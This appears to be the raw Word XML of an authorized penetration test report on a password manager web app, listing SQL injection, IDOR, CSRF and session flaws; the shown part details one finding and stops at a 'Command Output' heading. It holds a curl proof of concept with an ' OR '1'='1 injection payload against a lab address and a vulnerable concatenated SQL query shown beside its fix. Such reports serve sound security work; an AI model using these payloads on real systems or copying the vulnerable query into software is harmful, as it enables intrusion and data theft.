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FailSafe Password Manager</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Web Application Penetration Test Report</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Business Confidential</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Date:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> January 18, 2026  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Project:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> PWPA</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Client:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> FailSafe Password Manager  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Assessor:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Nittin Nobby Mathew </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Version:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 1.0 (Final)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Table of Contents</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Confidentiality Statement</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Disclaimer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Assessment Overview</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Executive Summary</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Finding Severity Ratings</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Scope</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Critical Findings (25-Point Vulnerabilities)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>High Priority Findings (Reportable Vulnerabilities)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Medium Priority Findings (Weaknesses)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Remediation Summary</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Testing Coverage</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Tools and Environment</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Conclusion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Confidentiality Statement</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>This document is the exclusive property of FailSafe. This document contains proprietary and confidential information. Duplication, redistribution, or use, in whole or in part, in any form, requires consent of FailSafe management.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>This document may be shared with auditors under non-disclosure agreements to demonstrate penetration test requirement compliance.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Disclaimer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>This penetration test was conducted with authorization from FailSafe management. The findings and recommendations contained in this report are based on the scope of work agreed upon. The assessor is not responsible for any damages resulting from the implementation or non-implementation of the recommendations provided in this report.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Assessment Overview</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>From January 18, 2026 to January 22, 2026, FailSafe engaged Nittin Nobby Mathew to evaluate the security posture of its web application compared to current industry best practices that included a comprehensive penetration test. All testing performed is based on the NIST SP 800-115 Technical Guide to Information Security Testing and Assessment, OWASP Testing Guide (v4), and customized testing frameworks.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Phases of penetration testing activities include the following:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>•</w:t>
        <w:tab/>
        <w:t>Planning – Customer goals are gathered and rules of engagement obtained.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>•</w:t>
        <w:tab/>
        <w:t>Discovery – Perform scanning and enumeration to identify potential vulnerabilities, weak areas, and exploits.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>•</w:t>
        <w:tab/>
        <w:t>Attack – Confirm potential vulnerabilities through exploitation and perform additional discovery upon new access.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>•</w:t>
        <w:tab/>
        <w:t>Reporting – Document all found vulnerabilities and exploits, failed attempts, and company strengths and weaknesses.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Executive Summary</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">A comprehensive penetration test of the FailSafe Password Manager web application was conducted to identify security vulnerabilities and weaknesses. The assessment identified </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4 critical vulnerabilities</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>multiple reportable weaknesses</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Key Findings:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SQL Injection in registration username field</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SQL Injection in vault add title field</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Insecure Direct Object Reference (IDOR) in vault edit endpoint</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Broken Authentication - Session Fixation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Cross-Site Request Forgery (CSRF) in account update functionality</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Weak rate limiting on login and vault unlock endpoints</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Weak password validation policies</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Missing security headers</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Cleartext password submission over HTTP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Information disclosure through error messages</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Risk Level:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> HIGH - Immediate remediation required</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Attack Summary</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The following table describes how vulnerabilities were identified and exploited during the penetration test to demonstrate their impact on the FailSafe application:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="LightGrid-Accent1"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8640"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="8640"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Action</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="8640"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Exploited SQL Injection in registration endpoint to create accounts with malicious usernames</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="8640"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Used SQL Injection in vault add endpoint to manipulate stored data</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="8640"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Leveraged IDOR vulnerability in vault edit/delete endpoints to access other users' data</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="8640"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Exploited Session Fixation vulnerability to maintain persistent unauthorized access</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="8640"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Performed CSRF attack on account update endpoint to force password changes</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="8640"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Bypassed weak rate limiting on login and vault unlock endpoints for brute force attacks</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Finding Severity Ratings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CVSS Score</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>9.0-10.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Immediate exploitation risk, system compromise</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>7.0-8.9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Significant impact, exploitation likely</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>4.0-6.9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Moderate impact, exploitation possible</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>0.1-3.9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Minor impact, limited exploitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Scope</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="LightGrid-Accent1"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
  </w:tblGrid>
      <w:tr>
  </w:tr>
      <w:tr/>
    </w:tbl>
    <w:p>
      <w:r>
        <w:t>•</w:t>
        <w:tab/>
        <w:t>Full scope information includes: registration, login, account management, vault functionality, API endpoints, session management, and authentication mechanisms</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Scope Exclusions</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Per client request, TCMS did not perform any Denial of Service attacks during testing. Infrastructure and underlying OS, third-party libraries and dependencies, and social engineering were also excluded.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="000000"/>
        </w:pBdr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>CRITICAL FINDINGS (25-Point Vulnerabilities)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Finding 1: SQL Injection - Registration Username Field</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Severity:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> CRITICAL (CVSS 9.8)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Status:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> CONFIRMED</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The registration endpoint accepts unsanitized user input in the username field, allowing SQL injection attacks. An attacker can inject SQL commands to bypass authentication, create unauthorized accounts, or potentially extract database information. This is a critical vulnerability as it requires no authentication and allows complete database compromise.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Vulnerability Details</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Endpoint:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> POST /register</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Parameter:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> username</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Type:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> SQL Injection (Boolean-based, UNION-based)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Authentication Required:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> No</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Proof of Concept</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Request:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -X POST http://10.0.0.10/register \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"username":"' OR '1'='1","password":"Password123!"}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Response:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{"message":"Registration successful!","success":true}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Account Created:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Username </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>test' OR '1'='1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> successfully registered</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Impact</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Account creation bypass with SQL payloads as usernames</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Potential database enumeration and data extraction</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Combined with IDOR: Complete account takeover chain</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>CVSS v3.1 Score</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Score:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 9.8 (Critical)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vector:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Remediation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Use Parameterized Queries:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   // Vulnerable</w:t>
        <w:br/>
        <w:t xml:space="preserve">   db.query("INSERT INTO users (username, password) VALUES ('" + username + "', '" + password + "')");</w:t>
        <w:br/>
        <w:t xml:space="preserve">   </w:t>
        <w:br/>
        <w:t xml:space="preserve">   // Secure</w:t>
        <w:br/>
        <w:t xml:space="preserve">   db.query("INSERT INTO users (username, password) VALUES (?, ?)", [username, password]);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Input Validation:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Whitelist allowed characters (alphanumeric, underscore, hyphen)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Enforce username length limits (3-20 characters)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Reject special SQL characters</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Use ORM Frameworks:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Implement Sequelize, TypeORM, or similar ORM</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Automatic parameterization</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">4. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Web Application Firewall (WAF):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Deploy WAF rules to detect SQL injection patterns</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Monitor for suspicious queries</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Screenshots and Reproduction Steps</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Recreation Steps:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Navigate to http://10.0.0.10 (homepage).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Click "Sign Up" button to open registration modal.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">3. In username field, enter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>' OR '1'='1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">4. In password field, enter: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Password123!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Click "Sign Up" button, observe success alert, then click "Log In", enter the same username/password, and verify redirect to /vault.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Step 1 Screenshot:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Registration modal with SQL payload in username field</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Step 2 Screenshot:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Clicking Sign Up button</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Step 3 Screenshot:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Success alert message</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Step 4 Screenshot:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Login modal with created account</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Step 5 Screenshot:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Successful login redirect to vault page</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Command Output:</w:t>
